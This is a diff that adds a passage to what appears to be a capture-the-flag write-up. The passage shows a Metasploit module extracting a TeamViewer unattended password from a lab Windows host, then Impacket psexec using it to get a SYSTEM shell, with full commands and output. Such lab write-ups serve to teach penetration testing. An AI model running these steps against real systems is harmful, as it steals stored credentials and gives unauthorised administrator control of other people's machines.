@@ -425,3 +425,32 @@ Image Name                     PID Session Name        Session#    Mem Usage
 TeamViewer_Service.exe        2952                            0     18,704 K
 ```
 
+From here when we search metasploit for teamviewer we find a module for getting passwords. When it is ran we get the Password `!R3m0te!`
+
+```bash
+msf5 post(windows/gather/credentials/teamviewer_passwords) > run
+[*] Finding TeamViewer Passwords on REMOTE 
+[+] Found Unattended Password: !R3m0te!
+[+] Passwords stored in: /root/.msf4/loot/20200327092135_default_10.10.10.180_host.teamviewer__775319.txt
+[*] Post module execution completed 
+```
+
+Now that we have new creds it is best to test them with psexec. Impacket is a collection of tools that can be used against windows systems.  Located at `/usr/share/doc/python3-impacket/examples`
+
+```bash
+root@HTBKali:/usr/share/doc/python3-impacket/examples# ./psexec.py Administrator:\!R3m0te\!@10.10.10.180
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.180.....
+[*] Found writable share ADMIN$
+[*] Uploading file adRXOLfj.exe
+[*] Opening SVCManager on 10.10.10.180.....
+[*] Creating service yqYA on 10.10.10.180.....
+[*] Starting service yqYA.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
